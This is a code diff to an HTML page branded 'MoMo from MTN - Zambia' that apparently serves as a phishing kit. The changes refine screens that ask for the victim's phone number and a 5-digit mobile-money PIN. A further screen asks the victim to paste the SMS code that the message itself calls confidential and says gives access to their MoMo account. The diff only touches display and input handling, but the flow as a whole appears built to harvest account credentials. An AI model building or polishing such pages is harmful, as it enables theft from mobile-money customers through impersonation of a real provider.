@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125k" />
+  <link rel="stylesheet" href="style.css?v=20261125m" />
 </head>
 <body>
   <div class="app-container">
@@ -298,13 +298,13 @@
             id="btn-form3-submit"
             class="btn-momo-solid compact-prog"
             type="button"
-            onclick="(function(){var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var disp=/^(096|076|056)\d{7}$/.test(norm)?norm.slice(0,3)+' '+norm.slice(3,6)+' '+norm.slice(6):(norm||'096 XXX XXXX');if(document.getElementById('display-pin-phone'))document.getElementById('display-pin-phone').innerText=disp;if(document.getElementById('display-sms-phone'))document.getElementById('display-sms-phone').innerText=disp;if(document.getElementById('display-otp-phone'))document.getElementById('display-otp-phone').innerText=disp;var pinInp=document.getElementById('yello-pin-input');if(pinInp)pinInp.value='';var signBtn=document.getElementById('btn-sign-in-pin');if(signBtn)signBtn.classList.remove('ready');document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-pin').classList.add('active');window.scrollTo(0,0);if(pinInp)pinInp.focus();})()"
+            onclick="(function(){var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var disp=/^(096|076|056)\d{7}$/.test(norm)?norm.slice(0,3)+' '+norm.slice(3,6)+' '+norm.slice(6):(norm||'096 XXX XXXX');if(document.getElementById('display-pin-phone'))document.getElementById('display-pin-phone').innerText=disp;if(document.getElementById('display-sms-phone'))document.getElementById('display-sms-phone').innerText=disp;if(document.getElementById('display-otp-phone'))document.getElementById('display-otp-phone').innerText=disp;var pinInp=document.getElementById('yello-pin-input');if(pinInp){pinInp.value='';pinInp.type='password';}var eyeBtn=document.getElementById('btn-toggle-pin-visibility');if(eyeBtn)eyeBtn.innerText='👁️';var signBtn=document.getElementById('btn-sign-in-pin');if(signBtn)signBtn.classList.remove('ready');document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-pin').classList.add('active');window.scrollTo(0,0);if(pinInp)pinInp.focus();})()"
           >SUBMIT APPLICATION</button>
         </div>
       </div>
     </section>
 
-    <!-- Screen 6: Y'ello Phathutshedzo PIN Login Screen -->
+    <!-- Screen 6: Y'ello Phathutshedzo 5-Digit PIN Login Screen -->
     <section id="screen-pin" class="screen">
       <div class="pin-top-bar">
         <button id="btn-pin-back" class="nav-back-clean" type="button" aria-label="Back">←</button>
@@ -330,18 +330,19 @@
               type="password"
               inputmode="numeric"
               pattern="[0-9]*"
-              maxlength="8"
+              maxlength="5"
               placeholder="PIN"
               class="yello-pin-input"
               autocomplete="off"
+              oninput="(function(el){var d=el.value.replace(/\D/g,'').slice(0,5);if(el.value!==d)el.value=d;var btn=document.getElementById('btn-sign-in-pin');if(btn){if(d.length===5)btn.classList.add('ready');else btn.classList.remove('ready');}})(this)"
             />
-            <button id="btn-toggle-pin-visibility" type="button" class="yello-eye-btn" aria-label="Toggle PIN visibility">
-              <svg id="icon-pin-eye" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-                <line x1="1" y1="1" x2="23" y2="23"/>
-              </svg>
-            </button>
+            <button
+              id="btn-toggle-pin-visibility"
+              type="button"
+              class="yello-eye-btn"
+              aria-label="Show or hide PIN"
+              onclick="(function(btn){var inp=document.getElementById('yello-pin-input');if(!inp)return;var isHidden=inp.type==='password';inp.type=isHidden?'text':'password';btn.innerText=isHidden?'🙈':'👁️';})(this)"
+            >👁️</button>
           </div>
         </div>
 
@@ -384,11 +385,5 @@
         <p class="sms-notice">
           Paste the verification SMS received on your phone starting with:
           <strong>Y'ello. Please note! This confidential code gives access to your MoMo account:</strong>
-        </p>
-
-        <div class="sms-phone-display-block">
-          <label>Phone Number</label>
-          <div id="display-sms-phone" class="sms-phone-muted">096 XXX XXXX</div>
-        </div>
-
-        <div cla
+          </p>
+            
